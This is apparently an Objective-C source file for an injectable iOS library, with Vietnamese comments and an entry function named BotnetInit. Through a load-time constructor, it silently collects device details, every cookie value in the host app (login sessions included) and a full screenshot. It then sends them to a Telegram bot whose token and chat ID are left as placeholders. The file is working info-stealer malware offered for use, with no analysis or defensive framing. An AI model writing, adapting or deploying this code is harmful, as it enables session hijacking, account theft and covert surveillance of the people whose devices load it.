#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <CoreTelephony/CTTelephonyNetworkInfo.h>
#import <CoreTelephony/CTCarrier.h>
#import <ifaddrs.h>
#import <arpa/inet.h>
#import <netinet/in.h>
#import <sys/socket.h>
#import <string.h>

// ================== CẤU HÌNH ==================
#define BOT_TOKEN @"YOUR_BOT_TOKEN_HERE"   // Thay bằng token mới
#define CHAT_ID   @"YOUR_CHAT_ID_HERE"     // Thay bằng chat id của bạn
// =============================================

#pragma mark - Device Info

NSString *getLocalIP(void) {
    struct ifaddrs *ifap = NULL;
    NSString *address = @"Unknown";

    if (getifaddrs(&ifap) == 0) {
        for (struct ifaddrs *ifa = ifap; ifa; ifa = ifa->ifa_next) {
            if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
            if (strcmp(ifa->ifa_name, "lo0") == 0) continue;

            char *ip = inet_ntoa(((struct sockaddr_in *)ifa->ifa_addr)->sin_addr);
            if (ip) {
                address = [NSString stringWithUTF8String:ip];
                break;
            }
        }
        freeifaddrs(ifap);
    }
    return address;
}

NSString *getCarrierName(void) {
    CTTelephonyNetworkInfo *info = [[CTTelephonyNetworkInfo alloc] init];
    NSString *name = @"Unknown";

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    CTCarrier *carrier = info.subscriberCellularProvider;
    if (carrier.carrierName.length > 0) {
        name = carrier.carrierName;
    }
#pragma clang diagnostic pop

    return name;
}

#pragma mark - Cookies

NSString *getAppCookies(void) {
    NSArray *cookies = [[NSHTTPCookieStorage sharedHTTPCookieStorage] cookies];

    if (cookies.count == 0) {
        return @"No cookies found in this app";
    }

    NSMutableString *result = [NSMutableString string];
    [result appendFormat:@"Total: %lu cookies\n\n", (unsigned long)cookies.count];

    for (NSHTTPCookie *c in cookies) {
        [result appendFormat:@"Domain : %@\n", c.domain ?: @"?"];
        [result appendFormat:@"Name   : %@\n", c.name ?: @"?"];
        [result appendFormat:@"Value  : %@\n", c.value ?: @"?"];
        [result appendFormat:@"Path   : %@\n", c.path ?: @"/"];
        [result appendFormat:@"Secure : %@\n", c.isSecure ? @"YES" : @"NO"];
        [result appendFormat:@"HttpOnly: %@\n", c.isHTTPOnly ? @"YES" : @"NO"];
        [result appendFormat:@"Expires: %@\n", c.expiresDate ? [c.expiresDate description] : @"Session"];
        [result appendString:@"------------------------------\n"];
    }
    return result;
}

#pragma mark - Screenshot

UIImage *takeScreenshot(void) {
    __block UIImage *image = nil;

    void (^capture)(void) = ^{
        CGSize size = [UIScreen mainScreen].bounds.size;
        UIGraphicsBeginImageContextWithOptions(size, NO, [UIScreen mainScreen].scale);

        for (UIWindow *window in [UIApplication sharedApplication].windows) {
            if (window.isHidden || window.alpha < 0.01) continue;
            [window drawViewHierarchyInRect:window.bounds afterScreenUpdates:YES];
        }

        image = UIGraphicsGetImageFromCurrentImageContext();
        UIGraphicsEndImageContext();
    };

    if ([NSThread isMainThread]) {
        capture();
    } else {
        dispatch_sync(dispatch_get_main_queue(), capture);
    }
    return image;
}

#pragma mark - Telegram

void sendText(NSString *text) {
    if (text.length == 0) return;

    NSString *encoded = [text stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
    if (!encoded) return;

    NSString *urlStr = [NSString stringWithFormat:
        @"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@",
        BOT_TOKEN, CHAT_ID, encoded];

    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) return;

    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
}

void sendPhoto(NSData *jpegData, NSString *caption) {
    if (!jpegData || jpegData.length == 0) return;

    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
    NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendPhoto", BOT_TOKEN]];
    if (!url) return;

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
   forHTTPHeaderField:@"Content-Type"];

    NSMutableData *body = [NSMutableData data];

    // chat_id
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"%@\r\n", CHAT_ID] dataUsingEncoding:NSUTF8StringEncoding]];

    // caption
    if (caption.length > 0) {
        [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[@"Content-Disposition: form-data; name=\"caption\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[[NSString stringWithFormat:@"%@\r\n", caption] dataUsingEncoding:NSUTF8StringEncoding]];
    }

    // photo
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: image/jpeg\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:jpegData];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

    // end
    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    request.HTTPBody = body;
    [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
}

#pragma mark - Entry

__attribute__((constructor))
void BotnetInit(void) {
    @autoreleasepool {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)),
                       dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            @try {
                // 1. Thông tin máy
                NSMutableString *info = [NSMutableString stringWithFormat:
                    @"📱 DEVICE INFO\n"
                    @"Model   : %@\n"
                    @"iOS     : %@\n"
                    @"Name    : %@\n"
                    @"IP      : %@\n"
                    @"Carrier : %@\n"
                    @"Time    : %@",
                    [UIDevice currentDevice].model ?: @"?",
                    [UIDevice currentDevice].systemVersion ?: @"?",
                    [UIDevice currentDevice].name ?: @"?",
                    getLocalIP(),
                    getCarrierName(),
                    [NSDate date]
                ];

                // 2. Cookie đăng nhập của app
                [info appendFormat:@"\n\n🍪 COOKIES (this app)\n%@", getAppCookies()];

                // Gửi text
                sendText(info);

                // 3. Screenshot
                UIImage *shot = takeScreenshot();
                if (shot) {
                    NSData *jpeg = UIImageJPEGRepresentation(shot, 0.75);
                    if (jpeg) {
                        NSString *caption = [NSString stringWithFormat:@"Screenshot • %@ • %@",
                                             [UIDevice currentDevice].name,
                                             [UIDevice currentDevice].systemVersion];
                        sendPhoto(jpeg, caption);
                    }
                }

            } @catch (NSException *e) {
                NSLog(@"[Botnet] Exception: %@", e);
            }
        });
    }
}
